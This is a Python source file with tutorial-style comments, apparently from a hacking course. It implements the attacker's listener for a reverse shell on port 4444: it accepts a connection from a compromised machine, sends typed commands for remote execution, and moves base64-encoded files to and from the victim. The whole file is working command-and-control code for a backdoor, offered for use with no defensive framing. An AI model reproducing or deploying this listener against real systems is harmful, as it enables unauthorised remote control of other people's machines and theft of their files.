import socket
import json
import base64


IP_ADDRESS = ''


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # TCP connection - stream based protocol - data is mixed up in the pipe
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)  # Backlog, 0 devices allowed in queue
        print("[+] Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("Got a connection from" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        # json.dumps is a method that converts data into a Json object
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        # This variable is going to contain bytes
        while True:
            # everytime we run this loop we are going to overwrite whatever is stored in json_data
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
        # json.loads = unpackaging of the data

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.reliable_receive()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            # we turn the string into a list in which each word becomes an element

            try:
                if command[0] == 'upload':
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())
                    # Appending a third item to the list 'command'
                    # with the file content

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result.encode())
                    # We encode what we receive because we opened this new file
                    # in 'writing bytes (wb)' mode

            except Exception:
                result = "[-] Error during command execution"

            print(result)


my_listener = Listener(IP_ADDRESS, 4444)
my_listener.run()
